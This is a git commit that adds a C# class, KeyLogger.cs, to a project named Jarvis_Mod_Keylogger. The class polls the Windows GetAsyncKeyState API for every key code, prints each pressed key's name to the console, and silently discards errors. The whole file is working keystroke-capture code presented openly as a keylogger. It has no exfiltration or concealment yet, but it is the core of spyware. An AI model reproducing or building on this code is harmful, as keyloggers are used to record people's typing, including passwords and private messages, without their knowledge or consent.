44371500cb05998525cc36aece94dace9b221a6e
GameGen <ramon.surna@gmail.com>
2015-09-06 04:28:48 +0200

    update 04 28

---
+++ Jarvis_Mod_Keylogger/KeyLogger.cs
@@ -0,0 +1,32 @@
+﻿using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+
+namespace Jarvis_Mod_Keylogger
+{
+    public class KeyLogger
+    {
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(int vKey);
+        [DllImport("User32.dll")]
+        private static extern short GetAsyncKeyState(Keys vKey);
+
+        public void Read()
+        {
+            try
+            {
+                foreach (int i in Enum.GetValues(typeof(Keys)))
+                {
+                    if (GetAsyncKeyState(i) == -32767)
+                    {
+                        Console.WriteLine(Enum.GetName(typeof(Keys), i) + " ");
+                        
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+            }
+        }
+    }
+}
